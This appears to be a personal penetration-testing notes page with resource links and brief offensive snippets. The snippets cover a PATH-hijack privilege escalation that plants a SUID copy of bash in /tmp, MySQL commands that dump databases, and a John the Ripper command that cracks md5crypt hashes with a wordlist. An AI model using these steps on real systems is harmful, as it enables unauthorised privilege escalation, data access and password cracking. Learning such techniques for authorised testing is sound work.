---
sort : 1
--- 


# Soon... 


Network/wireless/physical/Firewall/Social Eng/ .... Penetration testing ?? 
<!-- https://purplesec.us/types-penetration-testing/ -->


<!-- https://start.me/p/PwmnBd/web --> ALL 
<!-- https://www.mindmeister.com/1470766611/web-app-pentest?fullscreen=1 -->



Finding real IP behind CloudFlare or Tor
<!-- https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ -->



# be curious and not just a script kiddie.














# Attacks list

* PATH hijack  
    ```bash
    cd /tmp 
    export PATH=/tmp:$PATH

    echo "reverse shell" > bin
    # OR
    echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > bin 
    
    chmod +x bin
    ...

    ```
* Execution After Redirect (EAR)
* mysql ?? 
    ``` 
    mysql -u root -p 'passwd between qoutes' -e 'show databases;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'show tables;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'select * from table;' 
    ```







# Hash cracking
```bash
# md5   $1$ 

echo "hash" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt



# if you know the salt 




```